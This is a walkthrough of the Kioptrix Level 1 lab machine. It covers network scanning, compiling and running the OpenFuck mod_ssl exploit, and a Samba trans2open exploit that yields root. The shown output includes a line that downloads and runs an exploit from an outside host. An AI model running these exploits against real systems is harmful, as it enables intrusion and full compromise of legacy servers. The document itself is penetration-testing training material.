
## 🎯 Objective

* Identify the vulnerable services on **192.168.84.129**

* Exploit **Apache mod\_ssl** for initial shell access (user: apache)

* Enumerate and exploit **Samba 2.2.1a** for privilege escalation to root

* Restriction: ❌ No Metasploit framework

### Stage 1: Discovery of live devices on the network (Active Hosts Discovery)

🔹 Tool used: netdiscover

```plaintext
┌──(as㉿Test)-[~/Labs/Kioptrix]
└─$ sudo netdiscover -r 192.168.84.0/24

 Currently scanning: Finished!   |   Screen View: Unique Hosts                     
 6 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 360                                                   
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.84.1    00:50:56:c0:00:08      3     180  VMware, Inc.                                                    
 192.168.84.2    00:50:56:e2:e0:18      1      60  VMware, Inc.                                                    
 192.168.84.129  00:0c:29:6a:74:01      1      60  VMware, Inc.                                                    
 192.168.84.254  00:50:56:f9:b5:05      1      60  VMware, Inc.
```

### Stage 2: Scan the entire network to identify live devices (Ping Sweep)

Tool used: nmap ✅ Command:

```plaintext
┌──(as㉿Test)-[~/Labs/Kioptrix]
└─$ nmap -sn 192.168.84.0/24           
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-15 10:40 CDT
Nmap scan report for 192.168.84.1
Host is up (0.016s latency).
MAC Address: 00:50:56:C0:00:08 (VMware)
Nmap scan report for 192.168.84.2
Host is up (0.00010s latency).
MAC Address: 00:50:56:E2:E0:18 (VMware)
Nmap scan report for 192.168.84.129
Host is up (0.00065s latency).
MAC Address: 00:0C:29:6A:74:01 (VMware)
Nmap scan report for 192.168.84.254
Host is up (0.00024s latency).
MAC Address: 00:50:56:F9:B5:05 (VMware)
Nmap scan report for 192.168.84.128
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.36 seconds
```

-sn: Scan without port detection (Ping Scan only) 192.168.84.0/24 : Scan the entire Class C network (256 IP addresses)

📌 Results: 5 live devices confirmed:

```plaintext
192.168.84.1
192.168.84.2
192.168.84.128

192.168.84.129 ✅ Possible Target

192.168.84.254
```

Device 192.168.84.129 appears in both netdiscover and nmap, which makes it likely the target device.

### Step 3: Scan for open services and ports on the target

🔹 Tool: nmap ✅ Command:

```plaintext
┌──(as㉿Test)-[~/Labs/Kioptrix]
└─$ nmap -p- -sV -T5 -O 192.168.84.129 | tee Kiopxrix.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-15 10:52 CDT
Nmap scan report for 192.168.84.129
Host is up (0.0014s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
1024/tcp open  status      1 (RPC #100024)
MAC Address: 00:0C:29:6A:74:01 (VMware)
Device type: general purpose
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4
OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.06 seconds
```

🔍 Command Explanation:

| cucumber           | Meaning                                                                    |
| ------------------ | -------------------------------------------------------------------------- |
| `-p-`              | Scan all ports (1 to 65535)                                                |
| `-sV`              | Trying to discover the version of each service running on the open port    |
| `-T5`              | Aggressive Timing — used in test environments                              |
| `-O`               | OS Detection                                                               |
| `tee Kiopxrix.txt` | To save the results to a file at the same time they appear in the terminal |

### Stage 4: Identify the appropriate service for initial exploitation

🔍 Analyze the nmap output and choose the most appropriate target:

| Service               | Notes                                                                                                                                     | Your Decision                    |   |   |
| --------------------- | ----------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------- | - | - |
| **SSH**               | Version **2.9p2** (very old) but no obvious exploit without a username and password.                                                      | ✅ I left it out temporarily      |   |   |
| **SMB/Samba**         | The service appeared on port `139` but the **exact version** was not shown, making it difficult to search for a direct exploit.           | ✅ I initially ruled it out       |   |   |
| **Apache + mod\_ssl** | The version is obvious: `apache/1.3.20` + `mod_ssl/2.8.4` + `OpenSSL/0.9.6b` — this combination is known to have serious vulnerabilities. | ✅ **I chose to target it first** |   |   |

🔎 Why didn't we continue with Samba? Although the Samba service appears on port 139, the full version does not appear in the nmap output.

```plaintext
139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
```

We also used :

```plaintext
┌──(as㉿Test)-[~/Labs/Kioptrix]
└─$ enum4linux -a 192.168.84.129
```

```plaintext
┌──(as㉿Test)-[~/Labs/Kioptrix]
└─$ smbclient -L //192.168.84.129 -N
```

We also couldn't extract samba so the best option is the special exploit `Apache + mod\_ssl`

###### Next step:

Now we start searching for an exploit to release:

```plaintext
Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
```

You will find this exploitation : [https://www.exploit-db.com/exploits/764](https://www.exploit-db.com/exploits/764)

But it seems that there is a new update Here : [https://www.exploit-db.com/exploits/47080](https://www.exploit-db.com/exploits/47080)

Download the file to your device :

```plaintext
┌──(as㉿Test)-[~/Labs/Kioptrix]
└─$ ls
47080.c  Kiopxrix.txt
```

`47080.c` => It is C code ready for compilation and later exploitation.

### Stage 5: Identify and implement an exploit for the Apache + mod\_ssl vulnerability

📄 Analysis of the exploit header 47080.c :

```plaintext
┌──(as㉿Test)-[~/Labs/Kioptrix]
└─$ head 47080.c    
/*
 * OF version r00t VERY PRIV8 spabam
 * Version: v3.0.4 
 * Requirements: libssl-dev    ( apt-get install libssl-dev )
 * Compile with: gcc -o OpenFuck OpenFuck.c -lcrypto
 * objdump -R /usr/sbin/httpd|grep free to get more targets
 * #hackarena irc.brasnet.org
 * Note: if required, host ptrace and replace wget target
 */
```

🔍 What can we learn from this header? ✅ 1. Program name and version: `OF version r00t VERY PRIV8 spabam` → A modified version of the popular OpenFuck exploit

`Version: v3.0.4`→ The updated version of the vulnerability, supports more systems

✅ 2. Requirements before compiling:

```plaintext
┌──(as㉿Test)-[~/Labs/Kioptrix]
└─$ sudo apt-get install libssl-dev
```

📌 Because the exploit relies on the OpenSSL library, which is not automatically included in some Kali distributions.

✅ 3. Compilation Command:

```plaintext
┌──(as㉿Test)-[~/Labs/Kioptrix]
└─$ gcc 47080.c -o sslExploitKioptrix -lcrypto
```

📝 Explanation:

`-o OpenFuck` : Outputs an executable file named OpenFuck

`-lcrypto`: Links the OpenSSL cryptography library

Important Note: If you encounter problems during compilation, ensure that the OpenSSL development files are available via libssl-dev.

✅ 4. Additional command to help you choose the appropriate target :

```plaintext
┌──(as㉿Test)-[~/Labs/Kioptrix]
└─$ ./sslExploitKioptrix > exfile.txt                   

┌──(as㉿Test)-[~/Labs/Kioptrix]
└─$ cat exfile.txt | grep 1.3.20                        
        0x02 - Cobalt Sun 6.0 (apache-1.3.20)
        0x27 - FreeBSD (apache-1.3.20)
        0x28 - FreeBSD (apache-1.3.20)
        0x29 - FreeBSD (apache-1.3.20+2.8.4)
        0x2a - FreeBSD (apache-1.3.20_1)
        0x3a - Mandrake Linux 7.2 (apache-1.3.20-5.1mdk)
        0x3b - Mandrake Linux 7.2 (apache-1.3.20-5.2mdk)
        0x3f - Mandrake Linux 8.1 (apache-1.3.20-3)
        0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1
        0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2
        0x7e - Slackware Linux 8.0 (apache-1.3.20)
        0x86 - SuSE Linux 7.3 (apache-1.3.20)
```

It was our Target if you remember. :

```plaintext
Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
```

So our exploitation will be as follows:

```plaintext
0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1

0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2
```

### Step 6: Execute the exploit on the Apache + mod\_ssl service :

🧨 The goal: Exploiting the gap in the release:

```plaintext
Apache/1.3.20 + Mod_SSL/2.8.4 + OpenSSL/0.9.6B
```

Which works on the port:

```plaintext
443 (https)
```

###### 💻 How to Use :

```plaintext
┌──(as㉿Test)-[~/Labs/Kioptrix]
└─$ head -20 exfile.txt

*******************************************************************
* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

: Usage: ./sslExploitKioptrix target box [port] [-c N]

  target - supported box eg: 0x00
  box - hostname or IP address
  port - port for ssl connection
  -c open N connections. (use range 40-50 if u dont know)
  

  Supported OffSet:
```

🧠 Explanation: This output displays the tool's introduction along with general instructions.

The usage syntax is:

```plaintext
./sslExploitKioptrix <target> <IP> <port> -c <connections>
```

###### 💻 Run the exploit:

```plaintext
┌──(as㉿Test)-[~/Labs/Kioptrix]
└─$ ./sslExploitKioptrix 0x6b 192.168.84.129 443 -c 50  

*******************************************************************
* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

Connection... 50 of 50
Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80f80e0
Ready to send shellcode
Spawning shell...
bash: no job control in this shell
bash-2.05$ 
d.c; ./exploit; -kmod.c; gcc -o exploit ptrace-kmod.c -B /usr/bin; rm ptrace-kmo 
--08:43:20--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
           => `ptrace-kmod.c'
Connecting to dl.packetstormsecurity.net:443... connected!

Unable to establish SSL connection.

Unable to establish SSL connection.
gcc: ptrace-kmod.c: No such file or directory
gcc: No input files
rm: cannot remove `ptrace-kmod.c': No such file or directory
bash: ./exploit: No such file or directory
bash-2.05$ 
bash-2.05$ whoami
whoami
apache
```

### Stage 7: Post Exploitation :

🎯 Goal: Discover the Installed Samba Version Because you now have a shell on your system (with Apache privileges), you can use a variety of methods to extract the Samba service version :

```plaintext
bash-2.05$ find / -name "smbd" 2>/dev/null
find / -name "smbd" 2>/dev/null
/usr/sbin/smbd

bash-2.05$ strings /usr/sbin/smbd | grep -i samba
strings /usr/sbin/smbd | grep -i samba
/var/log/samba
ERROR: Samba is not configured correctly for the word size on your machine
ERROR: Samba cannot create a SAM SID.
sambatest
Samba
Samba 
/etc/samba/printers.def
/etc/samba/smbpasswd
/var/cache/samba
/usr/share/samba/codepages
/etc/samba/lmhosts
/etc/samba/smb.conf
You are using a Samba server
Samba Printer Port
Send a mail to samba@samba.org
# Samba SMB password file
/etc/samba/smb.conf

bash-2.05$ ls -la /usr/share/doc | grep samba
ls -la /usr/share/doc | grep samba
drwxr-xr-x    4 root     root         4096 Sep 26  2009 samba-2.2.1a
bash-2.05$
```

Now that we have a shell installed on the system using Apache user privileges, it's time to move on to the post-exploitation stage. One of the most important steps now is to determine the version of the Samba service installed on the system, as it may contain vulnerabilities that allow privilege escalation.

##### 🧪 How did we extract the Samba version?

🔹 Step 1: Find the Samba service executable file `find / -name "smbd" 2>/dev/null`

🔍 This command searches the entire system for any file named smbd, which is the main executable file for the Samba service. ✅ Result: `/usr/sbin/smbd`

🔹 Step 2: Attempt to extract information from the file itself `strings /usr/sbin/smbd | grep -i samba`

This command displays the text contained within the executable file (smbd) and filters it to display lines containing the word "samba."

✅ The results included references to:

* Samba configuration files

* Samba temporary storage folders

* Service error messages

* ⚠️ However, the version number was not clearly found in these results.

🔹 Step 3: Search the Documentation Files

```plaintext
ls -la /usr/share/doc | grep samba
```

📁 The /usr/share/doc folder typically contains the documentation files for packages installed on the system. ✅ Result:

```plaintext
drwxr-xr-x    4 root     root         4096 Sep 26  2009 samba-2.2.1a
```

🎉 Here we find the folder name:

```plaintext
samba-2.2.1a
```

This indicates that the version installed on this machine is:

Samba version 2.2.1a

### Step 8: Exploiting the Samba 2.2.1a (Privilege Escalation) vulnerability :

Samba 2.2.x - 'call\_trans2open' Remote Buffer Overflow (1) | [Link](https://www.exploit-db.com/exploits/22468)

##### 🎯 Objective:

Exploit the vulnerability known as: `Samba 2.2.x – ‘call_trans2open’ Remote Buffer Overflow Exploit-DB ID: 22468` The vulnerability targets Samba versions up to 2.2.8a, including our current version 2.2.1a.

📌 What does this vulnerability do?

* It is executed over port 139 (NetBIOS/Samba).

* It leads to remote command execution (RCE) with root privileges.

* It gives the attacker a remote shell on the target.

⚙️ Practical steps for exploitation: Since the exploitation file is written in C language ✅ 1. Download the code from Exploit-DB:

Download | [link](https://www.exploit-db.com/exploits/22468)

File adjustment steps :

1. Delete the lines that are not code and should be deleted or converted to a comment.

2. You will add clouds to these things :

```plaintext
//Prevents errors like: implicit declaration of function 'strlen'
//Provides functions for handling strings such as strlen(), memset()
#include <string.h>

// Prevents errors of type: unknown type name 'size_t'
// Definition of size_t and NULL data types
#include <stddef.h>
```

✅ 2 Usage Explanation :

```plaintext
┌──(as㉿Test)-[~/Labs/Kioptrix]
└─$ head -50  Sampa.txt

 Samba v2.2.x call_trans2open() Remote Overrun exploit for XxxxBSD by Xpl017Elz.

 Usage: ./SambaExploit -option [argument]

        -h - hostname. (default: localhost)
        -s - shellcode. (select target)
        -t - target number.
        -b - auto brute-force attack mode.
        -i - help information.

 Select target number:

        {0} FreeBSD 4.6.2-RELEASE #0 i386, Samba v2.2.x
        {1} OpenBSD 3.0 GENERIC#94 i386, Samba v2.2.x

 Example> ./SambaExploit -hlocalhost -s 0x82828282
```

Explanation :

```plaintext
┌──(as㉿Test)-[~/Labs/Kioptrix]
└─$ ./SambaExploit -h 192.168.84.129 -s 0x82828282 -t 0

 Samba v2.2.x call_trans2open() Remote Overrun exploit for XxxxBSD by Xpl017Elz.

 [0] Target: FreeBSD 4.6.2-RELEASE #0 i386, Samba v2.2.x
 [1] Set socket.
 [2] Make shellcode & Send Packet.
 [3] Trying 192.168.84.129:10000.
 [-] Connect Failed.
```

Modify SH\_PORT at the beginning of the code from :

```plaintext
#define SH_PORT (10000)
#define ATK_PORT (10000)
```

Modify SH\_PORT at the beginning of the code to read :

```plaintext
#define SH_PORT (139) // ← The shell will open here after the exploit
#define ATK_PORT (139) // ← The attack is carried out through this port
```

Since the only open connection is on port 139 (Samba), it is best to use it fully for exploitation and get a shell on it directly.

Recompile the code:

```plaintext
gcc 22468.c -o SambaExploit
```

Exploiting with a connection to the same port: Open netcat on port 139 at the same time as running the exploit :

```plaintext
┌──(as㉿Test)-[~/Labs/Kioptrix]
└─$ nc -nlvp 139
listening on [any] 139 ...


^C
```

Run the exploit :

```plaintext
┌──(as㉿Test)-[~/Labs/Kioptrix]
└─$ ./SambaExploit -h 192.168.84.129 -s 0x82828282 -t 0

 Samba v2.2.x call_trans2open() Remote Overrun exploit for XxxxBSD
                                                     by Xpl017Elz.

 [0] Target: FreeBSD 4.6.2-RELEASE #0 i386, Samba v2.2.x
 [1] Set socket.
 [2] Make shellcode & Send Packet.
 [3] Trying 192.168.84.129:139.
 [*] Connected to 192.168.84.129:139.
 [*] Executed shell successfully !
 [*] Command: # su -l; uname -a; id; exec sh -i

 [*] Happy-Exploit
```

###### NOT exploit

##### Move to another method of exploitation

Stop Here , Search Anather Way =>

##### Use searchsploit :

🔹 Update the exploit database:

```plaintext
searchsploit -u
```

🔍 Search command:

```plaintext
┌──(as㉿Test)-[~/Labs/Kioptrix]
└─$ searchsploit samba 2.2.1a
---------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                    |  Path
---------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Samba 2.2.0 < 2.2.8 (OSX) - trans2open Overflow (Metasploit)                                                                      | osx/remote/9924.rb
Samba < 2.2.8 (Linux/BSD) - Remote Code Execution                                                                                 | multiple/remote/10.c
Samba < 3.0.20 - Remote Heap Overflow                                                                                             | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                                     | linux_x86/dos/36741.py
---------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

1. View the code directly:

```plaintext
searchsploit -x multiple/remote/10.c
```

2. Copy the file to the working directory:

```plaintext
┌──(as㉿Test)-[~/Labs/Kioptrix]
└─$ searchsploit -m multiple/remote/10.c
  Exploit: Samba < 2.2.8 (Linux/BSD) - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/10
     Path: /usr/share/exploitdb/exploits/multiple/remote/10.c
    Codes: OSVDB-4469, CVE-2003-0201
 Verified: True
File Type: C source, ASCII text
Copied to: /home/as/Labs/Kioptrix/10.c
```

Compile the code :

```plaintext
gcc 10.c -o samba_remote_exploit
```

Read the code to see if there is a way to use it like :

```plaintext
┌──(as㉿Test)-[~/Labs/Kioptrix]
└─$ ./samba_remote_exploit                             
samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)
--------------------------------------------------------------
Usage: ./samba_remote_exploit [-bBcCdfprsStv] [host]

-b <platform>   bruteforce (0 = Linux, 1 = FreeBSD/NetBSD, 2 = OpenBSD 3.1 and prior, 3 = OpenBSD 3.2)
-B <step>       bruteforce steps (default = 300)
-c <ip address> connectback ip address
-C <max childs> max childs for scan/bruteforce mode (default = 40)
-d <delay>      bruteforce/scanmode delay in micro seconds (default = 100000)
-f              force
-p <port>       port to attack (default = 139)
-r <ret>        return address
-s              scan mode (random)
-S <network>    scan mode
-t <type>       presets (0 for a list)
-v              verbose mode
```

💣 4. 🚀 Run the exploit :

```plaintext
┌──(as㉿Test)-[~/Labs/Kioptrix]
└─$ ./samba_remote_exploit -b 0 -c 192.168.84.128 -p 139 192.168.84.129
samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)
--------------------------------------------------------------
+ Bruteforce mode. (Linux)
+ Host is running samba.
+ Worked!
--------------------------------------------------------------
*** JE MOET JE MUIL HOUWE
Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
uid=0(root) gid=0(root) groups=99(nobody)
whoami
root

passwd root
New password: 1234
BAD PASSWORD: it is too short
Retype new password: 1234
Changing password for user root
passwd: all authentication tokens updated successfully
```

Log in later using root:1234 on the machine in Termenal :

<Image src="https://cdn.hashnode.com/res/hashnode/image/upload/v1752655078749/8db23251-8506-458f-b838-27a114408852.png" alt="" align="center" fullwidth="true" />

```plaintext
login: root

password: 1234
```

Then you will enter directly to the command line with root privileges.

### 🔚 Conclusion

> Kioptrix Level 1 wasn't just about gaining root access — it was a hands-on lesson in network discovery, service enumeration, targeted exploitation, and privilege escalation. Each phase mirrored real-world penetration testing scenarios, demanding both technical skill and analytical thinking.

###### So remember:

> ***💬 "Control*** ***the code, and you control the world." 🔐 From wiping metadata to gaining root access — every step is documented and my goal is to deeply understand the system, not just hack!***
>
> [***Abdelwahab Shandy***](https://abdelwahabshandy.hashnode.dev/)
>
> [***Linkedin***](https://www.linkedin.com/in/abdelwahab-ahmed-shandy/)
>
> [***GitHub***](https://github.com/abdelwahab-ahmed-shandy)
>
> ***See You Soon***
>
> ***AS Cyber “)).***

